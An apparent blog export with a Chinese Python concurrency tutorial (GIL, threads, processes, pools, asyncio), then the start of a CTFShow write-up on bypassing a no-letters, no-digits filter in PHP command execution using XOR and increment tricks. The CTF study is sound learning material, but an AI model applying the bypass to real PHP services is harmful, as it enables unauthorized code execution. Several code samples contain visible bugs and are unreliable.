<p>并发提供了一种程序组织结构方式，让问题的解决方案可以并行执行，但并行执行不是必须的。</p>
<h2 id="1-7-概念总结"><a href="#1-7-概念总结" class="headerlink" title="1.7 概念总结"></a>1.7 概念总结</h2><ul>
<li><code>**并行**</code>是为了利用多核加速多任务完成的进度</li>
<li><code>**并发**</code>是为了让独立的子任务都有机会被尽快执行，但不一定能加速整体进度</li>
<li><code>**非阻塞**</code>是为了提高程序整体执行效率</li>
<li><code>**异步**</code>是高效地组织非阻塞任务的方式</li>
</ul>
<h2 id="1-8-全局解释器锁"><a href="#1-8-全局解释器锁" class="headerlink" title="1.8 全局解释器锁"></a>1.8 全局解释器锁</h2><ul>
<li>CPython 在解释器进程级别有一把锁，叫做GIL，即全局解释器锁。</li>
<li>GIL 保证CPython进程中，只有一个线程执行字节码。甚至是在多核CPU的情况下，也只允许同时只能有一个CPU 上运行该进程的一个线程。</li>
<li>CPython中<ol>
<li><strong>IO密集型</strong>，某个线程阻塞，就会调度其他就绪线程；</li>
<li><strong>CPU密集型</strong>，当前线程可能会连续的获得GIL，导致其它线程几乎无法使用CPU。</li>
</ol>
</li>
<li>在CPython中由于有GIL存在，IO密集型，使用多线程较为合算；CPU密集型，使用多进程，要绕开GIL。</li>
</ul>
<p>要支持并发，必须拆分为多任务，不同任务相对而言才有阻塞&#x2F;非阻塞、同步&#x2F;异步。所以，并发、异步、非阻塞三个词总是如影随形。</p>
<h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a><center>多线程</center></h1><p>了解以上内容，就可以来看多线程了，标题明明没有多线程我为什么还要讲多线程呢？</p>
<p>Python因为<code>GIL（全局解释器锁）</code>的存在，Python的多线程并不是真正的多线程，但是在同步不阻塞的情况下，却可以发挥出多线程的效果，无法做到异步，但是可以推荐了解一下，了解之后可以更方便学习多进程。</p>
<h2 id="线程的基本概念"><a href="#线程的基本概念" class="headerlink" title="线程的基本概念"></a>线程的基本概念</h2><p><code>线程</code>是指进程内的一个执行单元,也是进程内的可调度实体。</p>
<p><font color="red"><strong>一个进程可以拥有多个线程。</strong></font></p>
<p>与进程的区别:  </p>
<ul>
<li><p>地址空间:进程内的一个执行单元;进程至少有一个线程;它们共享进程的地址空间;而进程有自己独立的地址空间； </p>
</li>
<li><p>资源拥有:进程是资源分配和拥有的单位,同一个进程内的线程共享进程的资源；</p>
</li>
<li><p>线程是处理器调度的基本单位,但进程不是；</p>
</li>
<li><p>二者均可并发执行。</p>
</li>
</ul>
<p>简而言之,<font color="red"><strong>一个程序至少有一个进程,一个进程至少有一个线程</strong></font>。</p>
<p>线程的划分尺度小于进程，使得多线程程序的并发性高。<br>另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。</p>
<h2 id="threading、queue"><a href="#threading、queue" class="headerlink" title="threading、queue"></a>threading、queue</h2><p>Python实现多线程主要用threading模块，线程同步则是用queue模块实现。</p>
<p>线程同步有4种实现方式：</p>
<ul>
<li>锁机制</li>
<li>信号量</li>
<li>条件判断</li>
<li>同步队列</li>
</ul>
<p>queue模块内部封装了锁原语，使用先进先出队列的时候使用互斥锁。</p>
<p>下面用这个例子讲解：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># 打开文件</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            line = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            q.put(line)</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resp</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = q.get()</span><br><span class="line">        s += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dir.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">                f.writelines(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    threadings = []</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    threadings.append(t1)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threadings:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t2 = threading.Thread(target=resp, args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">        threadings.append(t2)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threadings:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure>

<p>代码第26行实例化了一个先进先出的queue队列，27行创建一个线程池。</p>
<p><code>t1</code>是第一个线程，target指向方法，atgs指向传值，q后面必须加逗号。</p>
<p>31-33行，把t1添加到线程池，等他循环完，就阻塞。</p>
<h1 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a><center>多进程</center></h1><p>Python中的多线程无法利用多核优势，如果想要<code>充分地使用多核CPU的资源</code>，在python中大部分情况需要使用多进程。</p>
<h2 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h2><p>Python实现多进程主要依靠<code>multiprocessing模块</code>实现.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br></pre></td></tr></table></figure>

<p><code>multiprocessing</code>模块用来开启子进程，并在子进程中执行我们定制的任务（比如函数）</p>
<p><code>multiprocessing</code>模块的功能众多：支持子进程、<strong>通信和共享数据</strong>、执行不同形式的同步，提供了<code>Process、Queue、Pipe、Lock</code>等组件。</p>
<p><font color="red"><strong>与线程不同，进程没有任何共享状态，进程修改的数据，改动仅限于该进程内</strong></font></p>
<p>写法与线程类死，但是<font color="red"><strong>进程类必须在main()内</strong></font>,使用队列也必须是multiprocessing内的队列。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;线程启动了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    p1 = Process(target=text1, args=(q,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p1.join()</span><br></pre></td></tr></table></figure>

<p><font color="red"><strong>有两种启动方式，多线程必须用.start()，如果用.run()就降级为单进程了。</strong></font></p>
<h1 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a><center>进程池</center></h1><p>主要用multiprocessing中的Pool实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pool, Pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Pipe</span><br><span class="line">    <span class="comment"># 100个任务</span></span><br><span class="line">    data = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">100</span>))</span><br><span class="line">    <span class="comment"># 进程池大小</span></span><br><span class="line">    pool = Pool(processes=<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># 一个一个提交</span></span><br><span class="line">    <span class="comment"># pool_out_puts = pool.apply(index_pool,(q,))</span></span><br><span class="line">    <span class="comment"># 一次性大量提交</span></span><br><span class="line">    pool_out_puts = pool.<span class="built_in">map</span>(index_pool, (q,))</span><br><span class="line">    pool.close()<span class="comment"># 关闭进程</span></span><br><span class="line">    pool.join()<span class="comment"># 阻塞进程</span></span><br></pre></td></tr></table></figure>

<p><strong>线程池是不能用队列来进行通信的，要用管道，也就是Pipe</strong></p>
<p>apply_async() 异步提交任务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">num</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s : %s&#x27;</span> % (num, os.getpid()))</span><br><span class="line">    <span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res = p.apply_async(task, args=(i,))</span><br><span class="line">        <span class="built_in">print</span>(res.get())</span><br></pre></td></tr></table></figure>

<p>只能通过.get()得到返回值</p>
<p>通过异步的方式取返回值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">num</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s : %s&#x27;</span> % (num, os.getpid()))</span><br><span class="line">    <span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    res_lst = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res = p.apply_async(task, args=(i,))     <span class="comment"># 先把任务全提交</span></span><br><span class="line">        res_lst.append(res)</span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> res_lst:</span><br><span class="line">        <span class="built_in">print</span>(res.get())  <span class="comment"># get本身就有阻塞的效果了，就不需要join再阻塞一次了,谁先拿到结果先取谁就行了</span></span><br></pre></td></tr></table></figure>

<p>用map()提交任务时取返回值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool,Queue,Pipe</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    ret = <span class="built_in">map</span>(func, <span class="built_in">range</span>(<span class="number">20</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;--&gt;&#x27;</span>, i)    </span><br></pre></td></tr></table></figure>

<h1 id="异步"><a href="#异步" class="headerlink" title="异步"></a><center>异步</center></h1><h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>让一个线程在代码中来回切换游走。</p>
<p>协程（Corourine），也可以称为微线程，是一种用户态内的上下文切换技术。简而言之，其实就是通过一个线程实现代码块相互切换执行。</p>
<p>实现协程的方法的主流方法</p>
<p>async、await关键字（&gt;Python3.5）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sellp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sellp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [</span><br><span class="line">    asyncio.ensure_future(func1()),</span><br><span class="line">    asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去生成一个事件循环</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment"># 将任务放到任务列表</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>协程的意义</p>
<p>  在一个线程中遇到如果遇到IO等待时间，线程不会等待，利用空闲的时间再去做其他的事情。</p>
</li>
</ul>
<h2 id="asyncio事件循环"><a href="#asyncio事件循环" class="headerlink" title="asyncio事件循环"></a>asyncio事件循环</h2><p> 也就是一个死循环，去检测并执行某些代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 伪代码</span></span><br><span class="line"></span><br><span class="line">任务列表 = [任务<span class="number">1</span>， 任务<span class="number">2</span>， 任务<span class="number">3</span>，。。。。]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    可执行的任务列表，已完成的任务列表 = 去任务列表中检查所有任务，将<span class="string">&#x27;可执行&#x27;</span>和<span class="string">&#x27;已执行&#x27;</span>的任务返回</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 就绪任务 <span class="keyword">in</span> 可执行任务列表:</span><br><span class="line">        执行已就绪的任务</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 已完成的任务 <span class="keyword">in</span> 已完成的任务列表:</span><br><span class="line">        在任务列表中移除 已完成的任务</span><br><span class="line">        </span><br><span class="line">    如果 任务列表 中的任务都已完成，则终止循环</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tasks = [</span><br><span class="line">    asyncio.ensure_future(func1()),</span><br><span class="line">    asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去生成一个事件循环</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment"># 将任务放到任务列表</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure>



<ul>
<li><p>协程函数</p>
<ul>
<li>定义函数的时候<code>async def 函数名</code></li>
</ul>
</li>
<li><p>协程对象</p>
<ul>
<li>执行协程函数()得到的就是协程对象</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">result = func()</span><br></pre></td></tr></table></figure>

<p><strong>执行协程函数创建协程对象，函数内部不会执行代码</strong></p>
<p>如果想要运行协程函数内部代码，必须要把协程对象交给事件循环来处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">q = func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python &gt; 3.7</span></span><br><span class="line">asyncio.run(q)</span><br></pre></td></tr></table></figure>



<h2 id="await关键字"><a href="#await关键字" class="headerlink" title="await关键字"></a>await关键字</h2><p>await+可等待对象（协程对象、Future、Task对象）</p>
<p>  await就是等待对象的值得到结果之后在继续向下走</p>
<p>示例1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    response = <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run( func1() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>示例2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;返回值&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;执行协程函数内部代码&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">await</span> others()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;IO请求结束，结果为：&#x27;</span>, response)</span><br><span class="line"></span><br><span class="line">asyncio.run( func() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Task对象"><a href="#Task对象" class="headerlink" title="Task对象"></a>Task对象</h2><p>在事件循环中添加多个任务</p>
<p>Task对象用于并发的调度协程，通过<code>asyncio.create_task(协程对象)</code>的方式创建Task对象，这样可以让协程加入事件循环当中等待被调度执行。除了使用<code>asyncio.create_task()</code>函数以外，还可以用低层的<code>loop.create_task()</code>或<code>ensure_future()</code>函数。<strong>不建议手动实例化task对象。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;返回值&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main开始&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将任务添加到事件循环</span></span><br><span class="line">    task_list = [</span><br><span class="line">        asyncio.Task(others(), name=<span class="string">&#x27;n1&#x27;</span>),</span><br><span class="line">        asyncio.Task(others(), name=<span class="string">&quot;n2&quot;</span>)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;main结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># done是一个集合</span></span><br><span class="line">    done,pending = <span class="keyword">await</span> asyncio.wait(task_list, timeout=<span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(done)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建事件循环</span></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="concurrent-futures-Future-对象"><a href="#concurrent-futures-Future-对象" class="headerlink" title="concurrent.futures.Future()对象"></a>concurrent.futures.Future()对象</h2><p>使用线程池、进程池实现异步操作时用到的对象。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> Future</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.process <span class="keyword">import</span> ProcessPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">value</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个线程池</span></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建进程池</span></span><br><span class="line">pool1 = ProcessPoolExecutor(max_workers=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    fut = pool.submit(func, i)</span><br><span class="line">    <span class="built_in">print</span>(fut)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>以后可能存在交叉使用。</p>
<p>多个方法的时候，就回调函数</p>
<p>基于多线程实现的异步</p>
<p>CPU密集型用多进程，IO密集型用异步</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><center>总结</center></h1><ul>
<li><p>信号量，多进程，进程池的区别  </p>
<p>  <strong>信号量</strong>：如果有500件衣服要做，于是招了500个人，只有4台机器，谁完成任务了再进几个人，也就是4个信号量，500个进程，机器是cpu，4个cpu，每个人是每个进程，每件衣服是一个任务  </p>
<p>  <strong>多进程</strong>：500个人抢四台机器，每个人只能工作十分钟，相对于时间片，不管做没有做完，就走了，就是500个进程做500个任务  </p>
<p>  <strong>进程池</strong>：4个人做500件衣服，4台机器，谁来谁就可以做衣服。而对于多进程来说，操作系统来调度500个人谁用机器，谁不用机器，和调度4个人是不一样的。所以不能有几件衣服就雇几个人，而是都几台机器就雇几个人。这样人都转起来了，并且都能完成任务。而且工厂负担也小一点，这就是池的概念。</p>
</li>
</ul>
<p>CPU密集用多进程，IO密集用异步协程</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP无字母无数字命令执行</title>
    <url>/RCE/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%97%A0%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>根据CTFShow的命令执行41关的单独解析，及其拓展</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown91020240_p0.jpg"></p>
<span id="more"></span>

<p>假设一个情况，对提交的cmd参数进行了正则，不能有数字和字母，这种情况就用到了异或，那什么是异或呢？</p>
<h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>异或：如果a、b两个值不相同，则异或结果为一，如果a、b两个值相同，则异或结果为0。</p>
<p>异或速记口诀：相同为0，不同为1。</p>
<p>这里的值是指二进制的值。</p>
<p>PHP实现异或运算：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> a^b;</span><br></pre></td></tr></table></figure>


<p>游览器中执行如上代码，游览器会打印一个不可见字符，但是并没有报错。</p>
<p>修改代码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">ord</span>(a^b);</span><br></pre></td></tr></table></figure>


<p>执行脚本可以得到一个3。</p>
<p>那么为什么会得到一个3呢，a和b的Ascii码的二进制值，分别为<code>0110 0001</code>和<code>0110 0010</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220329091840.png"></p>
<p>得到二进制的<code>0000 0011</code> ，刚好是3，这就是解释了游览器中的3是怎么来的。</p>
<p>到此，是不是可以利用异或构建一个命令执行脚本，因为正则了数字和字母，所以先排除不可用用的Ascii码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ascii 33-47 58-64 91-96 123-126</span><br></pre></td></tr></table></figure>




<p>33-47包含的Ascii码是0011 1010 - 0100-0000</p>
<p>而a的Ascii值为0110 0001由于33-47的第二位永远为0，相同异或后为0，不满足条件pass掉。</p>
<p>58-64包含的Ascii码是0010 1010 - 0100 0000</p>
<p>就取最后一个0100 0000来测试构造a</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220329092011.png"></p>
<p>所以可得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>使用边来来构造出其他字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>);</span><br><span class="line"><span class="variable">$__</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$__</span>;</span><br></pre></td></tr></table></figure>


<p>这里可以顺利打印出b，<code>（通过自增）</code></p>
<p>综上可得：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>); <span class="comment">//a</span></span><br><span class="line"><span class="variable">$___</span>=++<span class="variable">$__</span>; <span class="comment">//b</span></span><br><span class="line"><span class="variable">$____</span>=++<span class="variable">$___</span>; <span class="comment">//c</span></span><br><span class="line"><span class="variable">$_____</span>=++<span class="variable">$____</span>; <span class="comment">//d</span></span><br><span class="line"><span class="variable">$______</span>=++<span class="variable">$_____</span>; <span class="comment">//e</span></span><br><span class="line"><span class="variable">$_______</span>=++<span class="variable">$______</span>; <span class="comment">//f</span></span><br><span class="line"><span class="variable">$________</span>=++<span class="variable">$_______</span>; <span class="comment">//g</span></span><br><span class="line"><span class="variable">$_________</span>=++<span class="variable">$________</span>; <span class="comment">//h</span></span><br><span class="line"><span class="variable">$__________</span>=++<span class="variable">$_________</span>; <span class="comment">//i</span></span><br><span class="line"><span class="variable">$___________</span>=++<span class="variable">$__________</span>; <span class="comment">//g</span></span><br><span class="line"><span class="variable">$____________</span>=++<span class="variable">$___________</span>; <span class="comment">//k</span></span><br><span class="line"><span class="variable">$_____________</span>=++<span class="variable">$____________</span>; <span class="comment">//l</span></span><br><span class="line"><span class="variable">$______________</span>=++<span class="variable">$_____________</span>; <span class="comment">//m</span></span><br><span class="line"><span class="variable">$_______________</span>=++<span class="variable">$______________</span>; <span class="comment">//n</span></span><br><span class="line"><span class="variable">$________________</span>=++<span class="variable">$_______________</span>; <span class="comment">//o</span></span><br><span class="line"><span class="variable">$_________________</span>=++<span class="variable">$________________</span>; <span class="comment">//p</span></span><br><span class="line"><span class="variable">$__________________</span>=++<span class="variable">$_________________</span>; <span class="comment">//q</span></span><br><span class="line"><span class="variable">$___________________</span>=++<span class="variable">$__________________</span>; <span class="comment">//r</span></span><br><span class="line"><span class="variable">$____________________</span>=++<span class="variable">$___________________</span>; <span class="comment">//s</span></span><br><span class="line"><span class="variable">$_____________________</span>=++<span class="variable">$____________________</span>; <span class="comment">//t</span></span><br><span class="line"><span class="variable">$______________________</span>=++<span class="variable">$_____________________</span>; <span class="comment">//u</span></span><br><span class="line"><span class="variable">$_______________________</span>=++<span class="variable">$______________________</span>; <span class="comment">//v</span></span><br><span class="line"><span class="variable">$________________________</span>=++<span class="variable">$_______________________</span>; <span class="comment">//w</span></span><br><span class="line"><span class="variable">$_________________________</span>=++<span class="variable">$________________________</span>; <span class="comment">//x</span></span><br><span class="line"><span class="variable">$__________________________</span>=++<span class="variable">$_________________________</span>; <span class="comment">//y</span></span><br><span class="line"><span class="variable">$___________________________</span>=++<span class="variable">$__________________________</span>; <span class="comment">//z</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>生成一个phpinfo()试试</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$_________________</span>.<span class="variable">$_________</span>.<span class="variable">$_________________</span>.<span class="variable">$__________</span>.<span class="variable">$_______________</span>.<span class="variable">$_______</span>.<span class="variable">$________________</span>)();</span><br></pre></td></tr></table></figure>


<p>执行即可得到</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220331113835.png"></p>
